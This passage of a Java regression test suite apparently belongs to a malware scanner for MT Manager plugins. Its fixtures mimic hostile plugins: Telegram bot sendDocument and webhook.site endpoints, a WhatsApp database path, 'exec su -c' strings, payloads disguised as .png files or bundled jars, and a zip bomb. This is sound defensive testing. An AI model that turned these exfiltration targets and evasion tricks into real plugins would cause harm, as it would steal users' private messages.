        check("plugin SDK version 1 is recognised",
                !hostKeptReport.hasRule("MFT005"), summarise(hostKeptReport));

        // Markdown Preview bundles mermaid.min.js: an inline data: URI image and an XML namespace URL.
        java.util.Map<String, byte[]> bundled = new java.util.LinkedHashMap<String, byte[]>();
        StringBuilder blob = new StringBuilder("var logo=\"data:image/png;base64,");
        for (int i = 0; i < 700; i++) {
            blob.append("iVBORw0KGgoAAAANSUhEUg".charAt(i % 22));
        }
        blob.append("\";var ns=\"http://www.eclipse.org/elk/ElkGraph\";");
        bundled.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"dexMode\": true, \"pluginID\": \"com.md.preview\","
                        + " \"versionCode\": 1, \"versionName\": \"1.0.0\", \"name\": \"Markdown Preview\","
                        + " \"description\": \"d\", \"interfaces\": []}"));
        java.util.Map<String, byte[]> mermaid = new java.util.LinkedHashMap<String, byte[]>();
        mermaid.put("files/mermaid-v10.min.js", Fixtures.bytes(blob.toString()));
        File bundledPlugin = fixtures.installedArchive("com.md.preview.v2", bundled, mermaid);
        ScanReport bundledReport = new PluginScanner(IocDatabase.empty())
                .scan(bundledPlugin, ScanBudget.unlimited());
        check("an inline data: URI image in a bundled library is not an encoded payload",
                !bundledReport.hasRule("OBF002"), summarise(bundledReport));
        check("an XML namespace URL is not a plain-HTTP finding",
                !bundledReport.hasRule("NET005"), summarise(bundledReport));

        // The exception is narrow: a bare Base64 blob with no data: URI in front of it still reports.
        java.util.Map<String, byte[]> bare = new java.util.LinkedHashMap<String, byte[]>();
        StringBuilder raw = new StringBuilder("String payload = \"");
        for (int i = 0; i < 700; i++) {
            raw.append("QUJDREVGR0hJSktMTU5PUFFSU1RVVld".charAt(i % 31));
        }
        raw.append("\";");
        bare.put("manifest.json",
                Fixtures.bytes(Fixtures.manifest("x.bareblob", "Bare", "demo.A")));
        bare.put("src/demo/A.java", Fixtures.bytes("package demo;\npublic class A { " + raw + " }\n"));
        ScanReport bareReport = scan(fixtures.rawArchive("bare-blob.mtp", bare, false));
        check("a Base64 blob that is not part of a data: URI is still reported",
                bareReport.hasRule("OBF002"), summarise(bareReport));

        // Every one of these is a real, distinct plugin; none is a lookalike of another.
        List<File> all = new ArrayList<File>();
        all.add(translator);
        all.add(preview);
        all.add(extractedPlugin);
        all.add(lenientPlugin);
        List<ScanReport> set = new PluginScanner(IocDatabase.empty()).scanAll(all, ScanBudget.unlimited());
        boolean anyLookalike = false;
        for (int i = 0; i < set.size(); i++) {
            if (set.get(i).hasRule("MFT011")) {
                anyLookalike = true;
            }
        }
        check("distinct plugins sharing a {name} placeholder are not called lookalikes",
                !anyLookalike, "MFT011 fired across distinct plugins");
    }

    private static void regressions(Fixtures fixtures) {
        String benign = "package demo;\npublic class A { public int n() { return 1; } }\n";

        // A payload renamed to .png used to escape every rule: the content check exempted image
        // extensions, the string scan skipped them, and so did the entropy check.
        Map<String, byte[]> disguisedImage = new LinkedHashMap<String, byte[]>();
        disguisedImage.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.png", "Png", "demo.A")));
        disguisedImage.put("src/demo/A.java", Fixtures.bytes(benign));
        disguisedImage.put("assets/banner.png", Fixtures.fakeDex(40 * 1024));
        ScanReport disguised = scan(fixtures.rawArchive("disguised-png.mtp", disguisedImage, false));
        check("a payload renamed to .png is still caught",
                disguised.hasRule("ARC003") && disguised.verdict() != Verdict.CLEAN,
                disguised.verdict() + " :: " + summarise(disguised));

        // ...while a genuine PNG must stay quiet, or the fix would just be noise.
        Map<String, byte[]> realImage = new LinkedHashMap<String, byte[]>();
        realImage.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.realpng", "Real", "demo.A")));
        realImage.put("src/demo/A.java", Fixtures.bytes(benign));
        realImage.put("assets/icon.png", Fixtures.fakePng(8 * 1024));
        ScanReport realImageReport = scan(fixtures.rawArchive("real-png.mtp", realImage, false));
        check("a genuine PNG is not reported as a payload",
                !realImageReport.hasRule("ARC003") && realImageReport.verdict() == Verdict.CLEAN,
                realImageReport.verdict() + " :: " + summarise(realImageReport));

        // Reads used to reserve the caller's ceiling rather than the member's size, so a plugin of
        // small files exhausted a 16 MB budget after sixteen of them.
        Map<String, String> many = new LinkedHashMap<String, String>();
        for (int i = 0; i < 25; i++) {
            many.put("src/demo/C" + i + ".java", "package demo;\npublic class C" + i + " {}\n");
        }
        File manyFiles = fixtures.directoryPlugin("many-small-files",
                Fixtures.manifest("demo.many", "Many", "demo.C0"), many);
        ScanReport manyReport = new PluginScanner(IocDatabase.empty())
                .scan(manyFiles, new ScanBudget(60000L, 16L * 1024 * 1024));
        check("small files do not exhaust the byte budget",
                manyReport.filesScanned() >= 25 && !manyReport.truncated(),
                "scanned " + manyReport.filesScanned() + ", truncated=" + manyReport.truncated());

        // scanAll shared one budget, so a large first package left later ones unscanned but still
        // reported as if they had been examined.
        Map<String, String> bulky = new LinkedHashMap<String, String>();
        StringBuilder filler = new StringBuilder("package demo;\npublic class B {\n");
        for (int i = 0; i < 400; i++) {
            filler.append("  // padding padding padding padding padding padding padding\n");
        }
        filler.append("}\n");
        for (int i = 0; i < 20; i++) {
            bulky.put("src/demo/B" + i + ".java", filler.toString().replace("class B ", "class B" + i + " "));
        }
        File bulkyPlugin = fixtures.directoryPlugin("bulky",
                Fixtures.manifest("demo.bulky", "Bulky", "demo.B0"), bulky);
        File hostile = fixtures.directoryPlugin("later-hostile",
                Fixtures.manifest("demo.later", "Later", "demo.S"),
                Fixtures.sources("src/demo/S.java",
                        "package demo;\npublic class S { String u = \"https://api.telegram.org/bot1/x\"; }\n"));
        List<File> pair = new ArrayList<File>();
        pair.add(bulkyPlugin);
        pair.add(hostile);
        List<ScanReport> both = new PluginScanner(IocDatabase.empty())
                .scanAll(pair, new ScanBudget(30000L, 200L * 1024));
        check("one large plugin does not starve the rest of the scan",
                both.get(1).hasRule("NET003"), summarise(both.get(1)));

        // An exhausted budget reported "No manifest.json" about a package whose manifest was present.
        File ordinary = fixtures.directoryPlugin("budget-denied",
                Fixtures.manifest("demo.budget", "Budget", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        ScanReport starved = new PluginScanner(IocDatabase.empty()).scan(ordinary, new ScanBudget(0L, 0L));
        check("an unread manifest is not reported as a missing one",
                !starved.hasRule("MFT001"), summarise(starved));

        // The translation-engine excuse came from the string appearing anywhere, so a comment
        // switched off a plugin's own network scoring.
        String fakeEngine = ""
                + "package demo;\n"
                + "// TranslationEngine\n"
                + "public class F {\n"
                + "  public void f() throws Exception {\n"
                + "    new java.net.URL(\"http://198.51.100.7/collect\").openConnection();\n"
                + "  }\n"
                + "}\n";
        ScanReport fakeReport = scan(fixtures.directoryPlugin("fake-engine",
                Fixtures.manifest("demo.fake", "Fake", "demo.F"),
                Fixtures.sources("src/demo/F.java", fakeEngine)));
        check("a comment cannot claim the translation-engine excuse",
                !fakeReport.hasRule("CTX001") && !fakeReport.traits.contains("translation-engine"),
                fakeReport.traits + " :: " + summarise(fakeReport));

        // Rescoring a report duplicated every derived combination finding and its weight.
        File exfilA = fixtures.directoryPlugin("idempotent-a",
                Fixtures.manifest("com.dup.tools", "Dup Tools", "demo.E"),
                Fixtures.sources("src/demo/E.java", ""
                        + "package demo;\n"
                        + "public class E {\n"
                        + "  String p = \"/data/data/com.whatsapp/databases\";\n"
                        + "  void f() throws Exception {"
                        + " new java.net.URL(\"https://webhook.site/z\").openConnection(); }\n"
                        + "}\n"));
        File exfilB = fixtures.directoryPlugin("idempotent-b",
                Fixtures.manifest("com.dup.tool", "Dup Tool", "demo.E"),
                Fixtures.sources("src/demo/E.java", "package demo;\npublic class E {}\n"));
        ScanReport alone = scan(exfilA);
        int aloneCount = countRule(alone, "CMB101");
        List<File> lookalikePair = new ArrayList<File>();
        lookalikePair.add(exfilA);
        lookalikePair.add(exfilB);
        List<ScanReport> rescored = new PluginScanner(IocDatabase.empty())
                .scanAll(lookalikePair, ScanBudget.unlimited());
        check("rescoring does not duplicate derived findings",
                aloneCount == 1 && countRule(rescored.get(0), "CMB101") == 1,
                "alone=" + aloneCount + " rescored=" + countRule(rescored.get(0), "CMB101")
                        + " score=" + rescored.get(0).score());

        // OBF008 matched `int i`, so ordinary for-loops read as obfuscation.
        StringBuilder loops = new StringBuilder("package demo;\npublic class L {\n  void f() {\n");
        for (int i = 0; i < 14; i++) {
            loops.append("    for (int i = 0; i < 3; i++) { System.out.print(i); }\n");
        }
        loops.append("  }\n}\n");
        ScanReport loopReport = scan(fixtures.directoryPlugin("loops",
                Fixtures.manifest("demo.loops", "Loops", "demo.L"),
                Fixtures.sources("src/demo/L.java", loops.toString())));
        check("ordinary for-loops are not reported as obfuscation",
                !loopReport.hasRule("OBF008"), summarise(loopReport));

        // "unofficial" contains "official", and was reported as a claim of official status.
        String honest = Fixtures.manifest("demo.honest", "Community Build", "demo.A")
                .replace("\"fixture\"", "\"An unofficial community build.\"");
        ScanReport honestReport = scan(fixtures.directoryPlugin("unofficial", honest,
                Fixtures.sources("src/demo/A.java", benign)));
        check("saying unofficial is not a claim of being official",
                !honestReport.hasRule("MFT008"), summarise(honestReport));

        String boastful = Fixtures.manifest("demo.boast", "Official Toolkit", "demo.A");
        ScanReport boastfulReport = scan(fixtures.directoryPlugin("official", boastful,
                Fixtures.sources("src/demo/A.java", benign)));
        check("claiming to be official is still reported",
                boastfulReport.hasRule("MFT008"), summarise(boastfulReport));

        // Two packages claiming one identity were skipped entirely, the strongest case of all.
        File cloneA = fixtures.directoryPlugin("clone-a",
                Fixtures.manifest("com.clone.tools", "Clone Tools", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        File cloneB = fixtures.directoryPlugin("clone-b",
                Fixtures.manifest("com.clone.tools", "Clone Tools", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        List<File> clones = new ArrayList<File>();
        clones.add(cloneA);
        clones.add(cloneB);
        List<ScanReport> cloneReports = new PluginScanner(IocDatabase.empty())
                .scanAll(clones, ScanBudget.unlimited());
        check("two plugins claiming the same identity are both flagged",
                cloneReports.get(0).hasRule("MFT011") && cloneReports.get(1).hasRule("MFT011"),
                summarise(cloneReports.get(0)) + " / " + summarise(cloneReports.get(1)));

        // A failed save was reported to the user as a stored trust decision.
        try {
            File blocker = new File(fixtures.root(), "not-a-directory");
            Fixtures.write(blocker, "x");
            IocDatabase db = IocDatabase.empty();
            db.trust("abc", "note");
            db.save(new File(blocker, "indicators.json"));
            check("a failed save is reported, not swallowed", false, "save() returned normally");
        } catch (java.io.IOException expected) {
            check("a failed save is reported, not swallowed", true, "IOException raised");
        }

        // Replacing the list must never leave the user with nothing, and must not litter the folder
        // with the temporary and backup files the replacement uses.
        try {
            File store = new File(fixtures.root(), "store/indicators.json");
            IocDatabase first = IocDatabase.empty();
            first.trust("1111111111111111111111111111111111111111111111111111111111111111", "first");
            first.save(store);
            IocDatabase second = IocDatabase.parse(readFile(store));
            second.trust("2222222222222222222222222222222222222222222222222222222222222222", "second");
            second.save(store);
            IocDatabase reloaded = IocDatabase.parse(readFile(store));
            boolean bothKept = reloaded.trustedCount() == 2;
            boolean tidy = !new File(store.getAbsolutePath() + ".tmp").exists()
                    && !new File(store.getAbsolutePath() + ".bak").exists();
            check("replacing the indicator list keeps its contents and leaves no debris",
                    bothKept && tidy, "entries=" + reloaded.trustedCount() + " tidy=" + tidy);
        } catch (java.io.IOException e) {
            check("replacing the indicator list keeps its contents and leaves no debris", false,
                    String.valueOf(e));
        }

        // A manifest that was present but unread used to be reported as malformed, with wording
        // implying the package was hiding its declarations.
        File normal = fixtures.directoryPlugin("unread-manifest",
                Fixtures.manifest("demo.unread", "Unread", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        ScanReport unread = new PluginScanner(IocDatabase.empty()).scan(normal, new ScanBudget(0L, 0L));
        check("an unread manifest is not reported as malformed",
                !unread.hasRule("MFT002") && unread.hasRule("MFT012"), summarise(unread));
        check("an unread manifest is not treated as evidence against the package",
                unread.verdict() == Verdict.CLEAN || unread.verdict() == Verdict.REVIEW,
                unread.verdict() + " score=" + unread.score() + " :: " + summarise(unread));

        // ...while a genuinely malformed one still is.
        ScanReport malformed = scan(fixtures.directoryPlugin("still-malformed", "{ not json at all",
                Fixtures.sources("src/demo/A.java", benign)));
        check("a malformed manifest is still reported as malformed",
                malformed.hasRule("MFT002") && !malformed.hasRule("MFT012"), summarise(malformed));

        // A .png holding plain text is not recognisable as any format, and "unrecognised" used to
        // count as "it is an image, skip it", so a package could keep its endpoints in assets/.
        Map<String, byte[]> textPng = new LinkedHashMap<String, byte[]>();
        textPng.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.textpng", "Wallpapers", "demo.A")));
        textPng.put("src/demo/A.java", Fixtures.bytes(benign));
        textPng.put("assets/theme.png", Fixtures.bytes(
                "endpoint https://api.telegram.org/bot777:AAG/sendDocument\n"
                        + "target /data/data/com.whatsapp/databases\n"));
        ScanReport textPngReport = scan(fixtures.rawArchive("text-png.mtp", textPng, false));
        check("a .png that is really text is still searched",
                textPngReport.hasRule("NET003") && textPngReport.hasRule("SEN001"),
                textPngReport.verdict() + " :: " + summarise(textPngReport));

        // ...and a real image is still skipped, so the fix does not turn every asset into noise.
        Map<String, byte[]> quietImage = new LinkedHashMap<String, byte[]>();
        quietImage.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.quiet", "Quiet", "demo.A")));
        quietImage.put("src/demo/A.java", Fixtures.bytes(benign));
        quietImage.put("assets/icon.png", Fixtures.fakePng(4096));
        ScanReport quietReport = scan(fixtures.rawArchive("quiet-image.mtp", quietImage, false));
        check("a genuine image is still skipped and reports nothing",
                quietReport.verdict() == Verdict.CLEAN, summarise(quietReport));

        // A jar's members are deflated, so searching the container's raw bytes finds nothing. libs/
        // is the documented home for third-party jars, which made it the obvious place to hide a
        // payload: before this, a plugin shipping one scanned Clean with zero findings.
        Map<String, byte[]> jarMembers = new LinkedHashMap<String, byte[]>();
        jarMembers.put("evil/Evil.class", Fixtures.bytes(
                "Runtime getRuntime exec su -c "
                        + "https://api.telegram.org/bot555:ZZZ/sendDocument "
                        + "/data/data/com.whatsapp/databases "
                        + "java/net/URL openConnection"));
        byte[] hostileJar = Fixtures.deflatedJar(jarMembers);
        check("the jar fixture really does hide its contents from a raw search",
                !Bytes.extractedText(hostileJar, 6).contains("telegram"),
                "the fixture must be compressed or it tests nothing");

        Map<String, byte[]> withJar = new LinkedHashMap<String, byte[]>();
        withJar.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.jar", "Helper", "demo.A")));
        withJar.put("src/demo/A.java", Fixtures.bytes(benign));
        withJar.put("libs/helper.jar", hostileJar);
        ScanReport jarReport = scan(fixtures.rawArchive("with-jar.mtp", withJar, false));
        check("a payload inside a bundled jar is found",
                jarReport.hasRule("NET003") && jarReport.hasRule("SEN001")
                        && jarReport.verdict().actionable(),
                jarReport.verdict() + " :: " + summarise(jarReport));
        check("evidence names the file inside the jar",
                evidenceMentions(jarReport, "helper.jar!evil/Evil.class"),
                "expected the nested path in the evidence");

        // Dalvik bytecode inside a library archive is a payload in a wrapper, not a library.
        Map<String, byte[]> jarWithDex = new LinkedHashMap<String, byte[]>();
        jarWithDex.put("payload.dex", Fixtures.fakeDex(2048));
        Map<String, byte[]> withDexJar = new LinkedHashMap<String, byte[]>();
        withDexJar.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.dexjar", "DexJar", "demo.A")));
        withDexJar.put("src/demo/A.java", Fixtures.bytes(benign));
        withDexJar.put("libs/wrapper.jar", Fixtures.deflatedJar(jarWithDex));
        ScanReport dexJarReport = scan(fixtures.rawArchive("with-dex-jar.mtp", withDexJar, false));
        check("executable code inside a bundled jar is reported",
                dexJarReport.hasRule("ARC009"), summarise(dexJarReport));

        // An ordinary library must not become noise just because it is now opened.
        Map<String, byte[]> quietJarMembers = new LinkedHashMap<String, byte[]>();
        quietJarMembers.put("util/Strings.class", Fixtures.bytes(
                "java/lang/String toUpperCase toLowerCase trim substring valueOf"));
        Map<String, byte[]> withQuietJar = new LinkedHashMap<String, byte[]>();
        withQuietJar.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.quietjar", "Quiet", "demo.A")));
        withQuietJar.put("src/demo/A.java", Fixtures.bytes(benign));
        withQuietJar.put("libs/strings.jar", Fixtures.deflatedJar(quietJarMembers));
        ScanReport quietJarReport = scan(fixtures.rawArchive("quiet-jar.mtp", withQuietJar, false));
        check("an ordinary bundled library stays clean",
                quietJarReport.verdict() == Verdict.CLEAN, summarise(quietJarReport));

        // The disguise rule decides that a .png holds something else by asking the detector what the
        // bytes actually are, so every media format it is expected to recognise must be one it really
        // does. A format it silently does not know is a hole in that rule, which is how this table
        // drifted before.
        Map<String, byte[]> magicSamples = new LinkedHashMap<String, byte[]>();
        magicSamples.put("png", Fixtures.fakePng(64));
        magicSamples.put("jpg", new byte[] {(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0, 0, 0, 0});
        magicSamples.put("jpeg", new byte[] {(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0, 0, 0, 0});
        magicSamples.put("gif", Fixtures.bytes("GIF89a________"));
        magicSamples.put("bmp", Fixtures.bytes("BM____________"));
        magicSamples.put("webp", Fixtures.bytes("RIFF____WEBPVP8 "));
        magicSamples.put("wav", Fixtures.bytes("RIFF____WAVEfmt "));
        magicSamples.put("mp3", Fixtures.bytes("ID3____________"));
        magicSamples.put("ogg", Fixtures.bytes("OggS___________"));
        magicSamples.put("mp4", Fixtures.bytes("____ftypisom____"));
        magicSamples.put("woff", Fixtures.bytes("wOFF___________"));
        magicSamples.put("woff2", Fixtures.bytes("wOF2___________"));
        magicSamples.put("otf", Fixtures.bytes("OTTO___________"));
        magicSamples.put("ttf", new byte[] {0x00, 0x01, 0x00, 0x00, 0, 0, 0, 0});

        StringBuilder undetectable = new StringBuilder();
        for (Map.Entry<String, byte[]> sample : magicSamples.entrySet()) {
            if (Bytes.detectKind(sample.getValue()) == null
                    || !Bytes.contentMatchesExtension(sample.getKey(), sample.getValue())) {
                undetectable.append(sample.getKey()).append(" (not detected) ");
            }
        }
        check("every media format the disguise rule relies on is one the detector can confirm",
                undetectable.length() == 0, undetectable.toString());

        // A genuine PNG header is not a clean bill of health for the rest of the file. Decoders ignore
        // trailing bytes, so a real image with a payload appended after it used to satisfy the
        // magic-bytes check and skip every content rule that follows.
        byte[] realPngHeader = Fixtures.fakePng(512);
        byte[] appended = Fixtures.bytes(
                "Runtime getRuntime exec su -c "
                        + "https://api.telegram.org/bot555:ZZZ/sendDocument "
                        + "/data/data/com.whatsapp/databases "
                        + "java/net/URL openConnection");
        byte[] polyglot = new byte[realPngHeader.length + appended.length];
        System.arraycopy(realPngHeader, 0, polyglot, 0, realPngHeader.length);
        System.arraycopy(appended, 0, polyglot, realPngHeader.length, appended.length);
        check("the polyglot fixture really is a valid PNG by the detector's own reckoning",
                "png".equals(Bytes.detectKind(polyglot)), String.valueOf(Bytes.detectKind(polyglot)));
        Map<String, byte[]> withPolyglot = new LinkedHashMap<String, byte[]>();
        withPolyglot.put("manifest.json",
                Fixtures.bytes(Fixtures.manifest("x.polyglot", "Themed", "demo.A")));
        withPolyglot.put("src/demo/A.java", Fixtures.bytes(benign));
        withPolyglot.put("assets/banner.png", polyglot);
        ScanReport polyglotReport = scan(fixtures.rawArchive("polyglot.mtp", withPolyglot, false));
        check("a payload appended after a valid image header is still found",
                polyglotReport.verdict() != Verdict.CLEAN, summarise(polyglotReport));

        // The other half of that bargain: reading ordinary images must not invent findings.
        Map<String, byte[]> withRealArt = new LinkedHashMap<String, byte[]>();
        withRealArt.put("manifest.json",
                Fixtures.bytes(Fixtures.manifest("x.art", "Arty", "demo.A")));
        withRealArt.put("src/demo/A.java", Fixtures.bytes(benign));
        withRealArt.put("icon.png", Fixtures.fakePng(24 * 1024));
        byte[] realJpeg = Fixtures.highEntropy(8 * 1024);
        realJpeg[0] = (byte) 0xFF;
        realJpeg[1] = (byte) 0xD8;
        realJpeg[2] = (byte) 0xFF;
        realJpeg[3] = (byte) 0xE0;
        withRealArt.put("assets/tile.jpg", realJpeg);
        ScanReport artReport = scan(fixtures.rawArchive("arty.mtp", withRealArt, false));
        check("a plugin whose assets are real images stays clean",
                artReport.verdict() == Verdict.CLEAN, summarise(artReport));

        // A v3 manifest explains compiled code where the build puts it, not compiled code anywhere.
        // Exempting the extension alone let a v3 package carry assets/payload.dex untouched, and skipped
        // the layout check with it.
        Map<String, byte[]> v3Hidden = new LinkedHashMap<String, byte[]>();
        v3Hidden.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"pluginID\": \"x.v3hidden\", \"pluginName\": \"V3\","
                        + " \"mainPreference\": \"demo.A\", \"interfaces\": []}"));
        v3Hidden.put("classes.dex", Fixtures.fakeDex(2048));
        v3Hidden.put("libs/helper.jar", Fixtures.deflatedJar(quietJarMembers));
        v3Hidden.put("assets/payload.dex", Fixtures.fakeDex(4096));
        ScanReport v3HiddenReport = scan(fixtures.rawArchive("v3-hidden.mtp", v3Hidden, false));
        check("a v3 package's own compiled output is not reported",
                !evidenceMentions(v3HiddenReport, "classes.dex")
                        && !evidenceMentions(v3HiddenReport, "libs/helper.jar"),
                summarise(v3HiddenReport));
        check("but bytecode dropped somewhere the build never puts it still is",
                v3HiddenReport.hasRule("ARC003")
                        && evidenceMentions(v3HiddenReport, "assets/payload.dex"),
                summarise(v3HiddenReport));

        // classesEVIL.dex is not a multidex output. Only classes.dex and classes<digits>.dex are.
        Map<String, byte[]> v3Lookalike = new LinkedHashMap<String, byte[]>();
        v3Lookalike.put("manifest.json", Fixtures.bytes(
                "{\"pluginSdkVersion\": 3, \"pluginID\": \"x.v3look\", \"pluginName\": \"V3L\","
                        + " \"mainPreference\": \"demo.A\", \"interfaces\": []}"));
        v3Lookalike.put("classes2.dex", Fixtures.fakeDex(2048));
        v3Lookalike.put("classesEVIL.dex", Fixtures.fakeDex(2048));
        ScanReport v3LookReport = scan(fixtures.rawArchive("v3-look.mtp", v3Lookalike, false));
        check("a multidex output is accepted and a lookalike name is not",
                !evidenceMentions(v3LookReport, "classes2.dex")
                        && evidenceMentions(v3LookReport, "classesEVIL.dex"),
                summarise(v3LookReport));

        // A member whose size is only declared after its data reports -1 while the walk is running, so
        // a guard that summed declared sizes never grew and one member could inflate without limit.
        // The walk now counts what actually comes out of the inflater, which the archive cannot lie
        // about. The cap is derived from the read allowance, so a small budget makes it reachable here.
        byte[] compressible = new byte[3 * 1024 * 1024];
        Map<String, byte[]> bomb = new LinkedHashMap<String, byte[]>();
        bomb.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.bomb", "Bomb", "demo.A")));
        bomb.put("src/demo/A.java", Fixtures.bytes(benign));
        bomb.put("assets/big.bin", compressible);
        File descriptorBomb = fixtures.dataDescriptorArchive("descriptor-bomb.mtp", bomb);
        check("the fixture really does withhold its sizes until after the data",
                sizeIsWithheldWhileWalking(descriptorBomb),
                "getSize() must read -1 during the walk or this tests nothing");
        ScanBudget tight = new ScanBudget(60000L, 200L * 1024);
        ScanReport bombReport = new PluginScanner(IocDatabase.empty()).scan(descriptorBomb, tight);
        check("a member that inflates past the walk's allowance stops the walk",
                ReportFormatter.plainText(bombReport).contains("while being read; stopped"),
                summarise(bombReport));

        // Negative control: the same tight budget truncates an ordinary package too, by the byte
        // allowance rather than by inflation. Asserting only that the report was truncated would have
        // passed without the inflation guard doing anything at all.
        Map<String, byte[]> smallOne = new LinkedHashMap<String, byte[]>();
        smallOne.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.small", "Small", "demo.A")));
        smallOne.put("src/demo/A.java", Fixtures.bytes(benign));
        smallOne.put("assets/tiny.bin", new byte[64]);
        ScanReport smallReport = new PluginScanner(IocDatabase.empty())
                .scan(fixtures.dataDescriptorArchive("descriptor-small.mtp", smallOne), tight);
        check("an archive that does not expand is not accused of expanding",
                !ReportFormatter.plainText(smallReport).contains("while being read; stopped"),
                summarise(smallReport));
        check("and the walk does not invent missing members out of stopping early",
                !ReportFormatter.plainText(bombReport).contains("missing from its data"),
                summarise(bombReport));

        // The same archive under a budget that can afford it is walked to the end, so the guard above
        // is a bound and not a refusal to read data-descriptor archives at all.
        ScanReport bombFully = new PluginScanner(IocDatabase.empty())
                .scan(descriptorBomb, ScanBudget.unlimited());
        check("an archive that withholds its sizes is still walked when there is room for it",
                !ReportFormatter.plainText(bombFully).contains("missing from its data"),
                summarise(bombFully));

        // A hash over a listing that quietly skipped part of the tree is not an identity for the
        // directory. Only the file-count cap used to say so; the depth cap returned in silence, so a
        // replacement differing only below that depth would pass the re-verification a destructive
        // action does and be acted on in place of the package that was examined.
        File deepPlugin = fixtures.directoryPlugin("deep",
                Fixtures.manifest("x.deep", "Deep", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        StringBuilder nest = new StringBuilder("assets");
        for (int i = 0; i < 30; i++) {
            nest.append("/d").append(i);
        }
        Fixtures.write(new File(deepPlugin, nest + "/buried.txt"), "past the depth cap");
        ScanReport deepReport = new PluginScanner(IocDatabase.empty())
                .scan(deepPlugin, ScanBudget.unlimited());
        check("a directory too deep to list fully has no verifiable identity",
                deepReport.contentHash.length() == 0, "got \"" + deepReport.contentHash + "\"");
        check("and says so, naming the cutoff, rather than reporting a package it did not read",
                deepReport.hasRule("ARC005")
                        && ReportFormatter.plainText(deepReport)
                                .contains("nested more than 24 levels deep"),
                summarise(deepReport));

        // Hashing is charged at a fraction of a file's length so that reserving it does not starve the
        // rules that run afterwards. That discount made a partial grant dangerous: reserve() hands back
        // whatever is left when it cannot meet the request, and the old check only asked for more than
        // zero, so a few spare bytes bought a full pass over the entire package. On MT Manager's UI
        // thread that is a freeze, not a slow scan.
        Map<String, byte[]> bulkyMembers = new LinkedHashMap<String, byte[]>();
        bulkyMembers.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.bulky", "Bulky", "demo.A")));
        bulkyMembers.put("src/demo/A.java", Fixtures.bytes(benign));
        bulkyMembers.put("assets/blob.bin", Fixtures.highEntropy(640 * 1024));
        File bulkyArchive = fixtures.rawArchive("bulky.mtp", bulkyMembers, false);
        ScanReport fullyPaid = new PluginScanner(IocDatabase.empty())
                .scan(bulkyArchive, ScanBudget.unlimited());
        check("a package the budget can afford to hash still gets an identity",
                fullyPaid.contentHash.length() == 64, "got \"" + fullyPaid.contentHash + "\"");
        ScanReport partlyPaid = new PluginScanner(IocDatabase.empty())
                .scan(bulkyArchive, new ScanBudget(60000L, 5000L));
        check("a hash the budget can only part-pay for is not computed at all",
                partlyPaid.contentHash.length() == 0, "got \"" + partlyPaid.contentHash + "\"");
        check("and the report says so rather than implying full coverage",
                partlyPaid.truncated(), summarise(partlyPaid));

        // A narrowing cast turned 2.9 into 2 and anything past the int range into Integer.MAX_VALUE,
        // silently rewriting fields that come from an untrusted manifest.
        try {
            Map<String, Object> odd = Json.parseObject(
                    "{\"a\": 2.9, \"b\": 1e18, \"c\": 2.0, \"d\": -7, \"e\": \"3\"}");
            check("a non-integer is not truncated into an integer field",
                    Json.integer(odd, "a", -1) == -1, "got " + Json.integer(odd, "a", -1));
            check("a value past the int range is not saturated",
                    Json.integer(odd, "b", -1) == -1, "got " + Json.integer(odd, "b", -1));
            check("whole numbers still read as integers",
                    Json.integer(odd, "c", -1) == 2 && Json.integer(odd, "d", -1) == -7
                            && Json.integer(odd, "e", -1) == 3,
                    "2.0 -> " + Json.integer(odd, "c", -1) + ", -7 -> " + Json.integer(odd, "d", -1)
                            + ", \"3\" -> " + Json.integer(odd, "e", -1));
        } catch (Json.JsonException e) {
            check("a non-integer is not truncated into an integer field", false, String.valueOf(e));
        }

        // Reading a package's identity must not require scanning it, and must work for both shapes.
        File identityDir = fixtures.directoryPlugin("identity",
                Fixtures.manifest("demo.identity", "Identity", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        Map<String, byte[]> identityArchive = new LinkedHashMap<String, byte[]>();
        identityArchive.put("manifest.json",
                Fixtures.bytes(Fixtures.manifest("demo.identity", "Identity", "demo.A")));
        identityArchive.put("src/demo/A.java", Fixtures.bytes(benign));
        File identityMtp = fixtures.rawArchive("identity.mtp", identityArchive, false);
        check("a package's identity can be read from a folder and from an archive",
                "demo.identity".equals(mt.safety.scanner.core.PluginManifest.readFrom(identityDir).pluginId)
                        && "demo.identity".equals(
                                mt.safety.scanner.core.PluginManifest.readFrom(identityMtp).pluginId),
                "folder and archive must agree");

        // Quarantine and restore must round-trip, leaving nothing behind on either side.
        File store = new File(fixtures.root(), "quarantine-store");
        mt.safety.scanner.Quarantine quarantine = new mt.safety.scanner.Quarantine(store);
        File victim = fixtures.directoryPlugin("to-quarantine",
                Fixtures.manifest("demo.victim", "Victim", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        mt.safety.scanner.Quarantine.Result moved = quarantine.quarantine(victim, "mt.safety.scanner");
        check("quarantine moves the plugin out of its folder",
                moved.ok && !victim.exists() && quarantine.list().size() == 1,
                moved.message);
        mt.safety.scanner.Quarantine.Result back = quarantine.restore("demo.victim");
        check("restore puts it back and empties the quarantine",
                back.ok && victim.isDirectory() && new File(victim, "manifest.json").isFile()
                        && quarantine.list().isEmpty(),
                back.message);
        check("restore refuses to move this scanner itself",
                !quarantine.quarantine(victim, "demo.victim").ok,
                "quarantining the scanner's own id must be refused");

        // Destructive commands have to be discoverable in both languages, not only English. MT
        // Manager's users are largely Chinese-speaking, so an English-only help string hides exactly
        // the commands that delete things.
        mt.safety.scanner.Strings english = mt.safety.scanner.Strings.forLanguage("en");
